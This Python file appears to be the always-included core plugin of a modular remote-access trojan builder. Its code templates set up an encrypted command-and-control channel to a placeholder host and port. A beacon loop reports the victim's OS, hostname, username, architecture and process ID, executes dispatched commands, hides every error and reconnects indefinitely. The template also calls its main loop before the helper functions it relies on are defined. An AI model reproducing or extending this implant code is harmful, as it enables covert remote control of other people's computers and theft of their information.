PLUGIN_META = {
    "name": "core",
    "desc": "Core networking, crypto, heartbeat, main loop (always included)",
    "deps": [],
    "always_include": True,
    "commands": {},
}

HEADER = r"""import socket, base64, json, os, sys, struct, hashlib, hmac, time, threading

C2_HOST = "{{C2_HOST}}"
C2_PORT = {{C2_PORT}}
ENCRYPTION_PASSWORD = "{{ENCRYPTION_PASSWORD}}"
RECONNECT_DELAY = {{RECONNECT_DELAY}}

def derive_key(pw, salt=b"whisper_salt_2024", ln=32):
    return hashlib.pbkdf2_hmac("sha256", pw.encode(), salt, 100000, ln)

def enc_bytes(p, k):
    iv = os.urandom(16); ks, c = b"", 0
    while len(ks) < len(p):
        ks += hmac.new(k, iv + struct.pack(">Q", c), hashlib.sha256).digest(); c += 1
    ct = bytes(x ^ y for x, y in zip(p, ks))
    return iv + hmac.new(k, iv + ct, hashlib.sha256).digest()[:16] + ct

def dec_bytes(d, k):
    iv, tag, ct = d[:16], d[16:32], d[32:]
    if not hmac.compare_digest(tag, hmac.new(k, iv + ct, hashlib.sha256).digest()[:16]):
        raise ValueError("integrity")
    ks, c = b"", 0
    while len(ks) < len(ct):
        ks += hmac.new(k, iv + struct.pack(">Q", c), hashlib.sha256).digest(); c += 1
    return bytes(x ^ y for x, y in zip(ct, ks))

_k = lambda: derive_key(ENCRYPTION_PASSWORD)
def encrypt(d): return base64.b64encode(enc_bytes(json.dumps(d).encode(), _k()))
def decrypt(d): return json.loads(dec_bytes(base64.b64decode(d), _k()))

def recv_msg(s):
    r = s.recv(4)
    if not r: return None
    sz = int.from_bytes(r, "big"); d = b""
    while len(d) < sz:
        c = s.recv(sz - len(d))
        if not c: return None
        d += c
    return decrypt(d)

def send_msg(s, d):
    p = encrypt(d)
    s.sendall(len(p).to_bytes(4, "big") + p)
"""

MAIN_LOOP = r"""
def _main():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(30); s.connect((C2_HOST, C2_PORT))
            send_msg(s, {"type": "init", "os": _os(), "hostname": _hn(), "user": _us(), "arch": _ar(), "pid": os.getpid()})
            s.settimeout(15)
            while True:
                try:
                    m = recv_msg(s)
                    if m is None: break
                except socket.timeout:
                    send_msg(s, {"type": "ping"}); continue
                if m["type"] == "exit": s.close(); return
                fn = _CMDS.get(m["type"])
                if fn:
                    try:
                        r = fn(m)
                        if r is not None:
                            send_msg(s, {"type": "response", **r})
                    except Exception as e:
                        send_msg(s, {"type": "response", "error": str(e)})
        except: pass
        finally:
            try: s.close()
            except: pass
        time.sleep(RECONNECT_DELAY)

if __name__ == "__main__": _main()

def _os(): import platform; return platform.platform()
def _hn(): import platform; return platform.node()
def _us(): return os.environ.get("USERNAME") or os.environ.get("USER") or "unknown"
def _ar(): import platform; return platform.machine()
"""

INIT_FUNC = lambda: {"os": _os(), "hostname": _hn(), "user": _us(), "arch": _ar(), "pid": os.getpid(), "plugins": [k for k, v in __import__('plugins', fromlist=['PLUGIN_REGISTRY']).PLUGIN_REGISTRY.items()]}
